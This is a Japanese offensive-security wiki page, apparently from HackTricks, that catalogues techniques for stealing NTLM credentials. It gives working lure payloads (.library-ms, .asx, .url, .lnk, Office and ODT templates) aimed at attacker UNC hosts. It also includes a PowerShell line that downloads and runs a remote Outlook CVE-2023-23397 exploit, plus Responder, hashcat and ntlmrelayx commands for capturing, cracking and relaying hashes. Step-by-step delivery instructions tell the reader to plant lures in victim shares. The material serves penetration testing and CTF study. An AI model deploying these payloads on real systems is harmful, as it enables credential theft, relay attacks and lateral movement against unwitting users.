# NTLM認証情報を盗む場所

{{#include ../../banners/hacktricks-training.md}}

**オンラインでのMicrosoft Wordファイルのダウンロードから、NTLM leakの情報源である https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md、さらに [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) まで、https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ にある優れたアイデアをすべて確認してください。**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 書き込み可能なSMB共有 + ExplorerでトリガーされるUNC誘導ファイル（ntlm_theft/SCF/LNK/library-ms/desktop.ini）

**ユーザーやスケジュールされたジョブがExplorerで開く共有に書き込める**場合、メタデータが自分のUNC（例：`\\ATTACKER\share`）を参照するファイルを配置します。フォルダーを表示すると**暗黙的なSMB認証**が発生し、リスナーに**NetNTLMv2**が漏えいします。<sup>[[1]](#references)</sup>

1. **誘導ファイルを生成する**（SCF/URL/LNK/library-ms/desktop.ini/Office/RTFなどに対応）

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **書き込み可能な共有フォルダーに置く**（被害者が開くフォルダーならどこでも可）:

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **傍受してcrack**：

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows では複数のファイルを一度に開くことがあります。Explorer がプレビューするものは（`BROWSE TO FOLDER`）、クリックは不要です。

### Windows Media Player プレイリスト（.ASX/.WAX）

対象者に、こちらが用意した Windows Media Player プレイリストを開かせるかプレビューさせることができれば、エントリの参照先に UNC パスを指定して Net-NTLMv2 を leak させられます。WMP は SMB 経由で参照先のメディアを取得しようとし、暗黙的に認証を行います。<sup>[[3]](#references)[[4]](#references)</sup>

ペイロードの例：

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

収集とcrackingのフロー：

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIPに埋め込まれた .library-ms による NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIPアーカイブ内から直接開いた .library-ms ファイルを安全でない方法で処理します。ライブラリ定義がリモートの UNC パス（例: \\attacker\share）を指している場合、ZIP内の .library-ms を閲覧または起動するだけで、Explorer が UNC を列挙し、攻撃者に NTLM 認証情報を送信します。これにより、オフラインでクラックしたり、中継したりできる可能性のある NetNTLMv2 が取得されます。<sup>[[2]](#references)</sup>

攻撃者の UNC を指す最小限の .library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

運用手順
- 上記の XML を使って .library-ms ファイルを作成します（IP/hostname を設定）。
- ZIP に圧縮し（Windows の場合: 送る → 圧縮 (zip 形式) フォルダー）、対象に送ります。
- NTLM capture listener を起動し、被害者が ZIP 内の .library-ms を開くのを待ちます。


### Outlook の予定表リマインダー音声パス（CVE-2023-23397）– zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows は、予定表アイテム内の拡張 MAPI プロパティ PidLidReminderFileParameter を処理していました。このプロパティが UNC パス（例: \\attacker\share\alert.wav）を指している場合、リマインダーの起動時に Outlook が SMB share に接続し、クリックなしでユーザーの Net-NTLMv2 が leak していました。この問題は 2023 年 3 月 14 日に修正されましたが、古いまま、または未対応の環境や過去のインシデント対応では、依然として非常に重要です。<sup>[[5]](#references)</sup>

PowerShell（Outlook COM）を使った簡単な悪用方法:

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

リスナー側：

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notes
- 被害者は、リマインダーが作動する時に Outlook for Windows を起動しているだけでよい。
- leak によって、オフラインでの cracking または relay に使用できる Net‑NTLMv2 が取得される（pass-the-hash は不可）。

### .LNK/.URL アイコンベースのゼロクリック NTLM leak（CVE‑2025‑50154 – CVE‑2025‑24054 の bypass）

Windows Explorer はショートカットのアイコンを自動的に表示します。最近の調査では、UNC アイコンを使ったショートカットに対する Microsoft の 2025 年 4 月の patch 適用後も、ショートカットのターゲットを UNC path 上に置き、アイコンをローカルに保持すれば、クリックなしで NTLM 認証を発生させられることが示されました（この patch bypass には CVE‑2025‑50154 が割り当てられました）。フォルダーを表示するだけで、Explorer はリモートターゲットからメタデータを取得し、攻撃者の SMB server に NTLM を送信します。<sup>[[6]](#references)</sup>

最小限の Internet Shortcut payload（.url）:

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShellでShortcut payload（.lnk）を作成:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

配布のアイデア
- ショートカットを ZIP に入れ、被害者に閲覧させる。
- 被害者が開く書き込み可能な共有フォルダーにショートカットを置く。
- 同じフォルダーに誘導用ファイルをほかにも置き、Explorer で項目がプレビューされるようにする。

### ExtraData のアイコンパスを介したクリック不要の .LNK NTLM leak（CVE‑2026‑25185）

Windows は `.lnk` のメタデータを実行時だけでなく、**表示／プレビュー**時（アイコンの描画時）にも読み込みます。CVE‑2026‑25185 では、**ExtraData** ブロックによってシェルがアイコンパスを解決し、**読み込み時に**ファイルシステムへアクセスする解析経路が示されています。パスがリモートの場合、外向きの NTLM 認証が発生します。

主なトリガー条件（`CShellLink::_LoadFromStream` で確認）:
- ExtraData に **DARWIN_PROPS** (`0xa0000006`) を含める（アイコン更新ルーチンを実行する条件）。
- **TargetUnicode** が設定された **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) を含める。
- ローダーは `TargetUnicode` 内の環境変数を展開し、展開後のパスに対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC パス（例: `\\attacker\share\icon.ico`）に解決されると、ショートカットを含むフォルダーを**表示するだけで**外向きの認証が発生します。同じ読み込み経路は**インデックス作成**や**AV スキャン**でも実行されるため、実用的なクリック不要の leak 攻撃面となります。<sup>[[7]](#references)</sup>

Windows GUI を使わずにこれらの構造を構築／検査できる調査用ツール（parser/generator/UI）は、**LnkMeMaybe** プロジェクトで利用できます。<sup>[[8]](#references)</sup>


### WebDAV auth coercion / `davclnt.dll,DavSetCookie` を介した認証情報の検証

ネイティブの **WebDAV client** を悪用すると、現在のログオンセッションに任意の **HTTP/WebDAV** エンドポイントへの認証を強制できます。

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

有用な理由:
- **攻撃者が制御する WebDAV server**に対して、カスタム client を配置せずに**HTTP 経由の NTLM**を発生させられます。
- **内部ホスト**に対しては、横展開する前に、盗んだ認証情報がどこで受け入れられるかを**静かに検証**できます。<sup>[[9]](#references)</sup>
- **SMB の外向き通信がフィルタリングされている**一方で、**HTTP/WebDAV**には到達できる場合に有効な代替手段です。

運用上の注意:
- ソースホストで**WebClient** service が実行されている必要があります。
- `rundll32.exe` は `davclnt.dll` を読み込み、Windows に**現在のユーザーの認証情報**を使った WebDAV 認証を処理させます。<sup>[[10]](#references)</sup>
- 自分が制御するインフラを指定する場合は、次のような NTLM 対応の HTTP listener/relay を使用します:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

検知の観点では、多数の内部システムに対して `rundll32.exe davclnt.dll,DavSetCookie` を繰り返し実行することは、通常のユーザー行動ではなく、**認証情報の検証 / sprayのような横方向移動の準備**を示す強いシグナルです。<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) によるNTLMの強制

Officeドキュメントは外部テンプレートを参照できます。添付テンプレートをUNCパスに設定すると、ドキュメントを開いたときにSMBで認証が行われます。

最小限のDOCXリレーションシップの変更（word/内）:

1) word/settings.xmlを編集し、添付テンプレートの参照を追加します:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels を編集し、rId1337 の参照先を自身の UNC に設定します:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx に再パッケージして提出します。SMB capture listener を起動し、ファイルが開かれるのを待ちます。

### SMB 認証用の ODT 外部オブジェクト

ドキュメントのアップロード先が `.odt` を受け付ける一方、対象が Office の `.docx` ファイルを開かない場合は、Office テンプレートの代わりに OpenDocument 外部オブジェクトを使用します。Metasploit の `auxiliary/fileformat/odt_badodt` は、以下の例のような on-load の `draw:object` 参照を含む `content.xml` を持つ ODT を生成します。`LHOST` を SMB listener に設定し、許可されたワークフローで ODT をアップロードして、ユーザーまたはドキュメントプロセッサが開いた際に送信される NetNTLMv2 response を取得します。ファイル名の拡張子チェックでは埋め込まれた URL は検査されません。また、対象上の受信 NTLM 制限では、送信認証を必ずしも阻止できません。<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

NTLM の relaying や悪用に関する capture 後のアイデアは、こちらを確認してください:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – 書き込み可能な共有で誘導 + Responder capture → NetNTLMv2 crack → svc_mssql の Kerberoast](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms の auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 で DA に昇格 (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP の NTLM leak → NTFS junction 経由で webroot RCE → FullPowers + GodPotato で SYSTEM 権限を取得](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 つの NTLM 脆弱性: Microsoft における未修正の権限昇格の脅威](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft が Outlook の EoP (CVE‑2023‑23397) を軽減し、PidLidReminderFileParameter 経由の NTLM leak を解説](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – ゼロクリックで NTLM を取得: Microsoft セキュリティパッチの bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 の解説](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe ツール](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT サポートからの電話: Teams からドメイン侵害に至る ModeloRAT キャンペーンの分析](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h ヘッダー](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 による WebDAV リクエスト](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Netntlm Hashes を窃取する際に注目すべき場所](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT 外部オブジェクトによる NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
